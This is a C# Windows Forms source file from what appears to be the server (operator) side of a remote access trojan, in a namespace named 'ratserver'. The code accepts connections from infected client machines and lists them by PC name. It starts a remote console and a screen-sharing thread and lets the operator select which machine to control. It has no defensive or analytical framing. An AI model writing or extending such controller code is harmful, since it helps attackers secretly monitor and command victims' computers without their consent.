using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ratserver
{
    public partial class Form1 : Form
    {
        public static Client selectedPc = null;
        public Form1()
        {
            InitializeComponent();
            ServerFunctions.Parent = this;
            ServerFunctions.BindSocket();
            FormClosing += (s, e) => 
            {
                foreach(Client client in ServerFunctions.Clients)
                {
                    client.Socket.Shutdown(SocketShutdown.Both);
                    client.Socket.Dispose();
                }
                ServerFunctions.ServerSocket.Dispose();
                ServerFunctions.Running = false;
                Environment.Exit(0);
            };

            new Thread(ServerFunctions.WaitForConnection).Start();
            new Thread(ConsoleThread.Start).Start();
            new Thread(ShareScreen.Start).Start();
        }

        public void ClientConnected(Client client) 
        {
            Invoke(new Action(() => {
                connectedClientsBox.Items.Add(client.PCName);
                if (connectedClientsBox.Items.Count == 1)
                    connectedClientsBox.SelectedIndex = 0;
            }));
        }

        public void ClientDisconnected(Client client)
        {
            Invoke(new Action(() => 
            {
                foreach(var item in connectedClientsBox.Items)
                {
                    Console.WriteLine(item);
                }
                connectedClientsBox.Items.Remove(client.PCName);
                if (connectedClientsBox.Items.Count != 0)
                    connectedClientsBox.SelectedIndex = 0;
                else selectedPc = null;
            }));
        }

        private void connectedClientsBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(ServerFunctions.Clients.Count != 0)
                try
                {
                    if(selectedPc != null)
                        ServerFunctions.SetShareScreen(selectedPc, false);
                    
                    selectedPc = ServerFunctions.Clients[connectedClientsBox.SelectedIndex];
                }
                catch { }
        }
    }
}
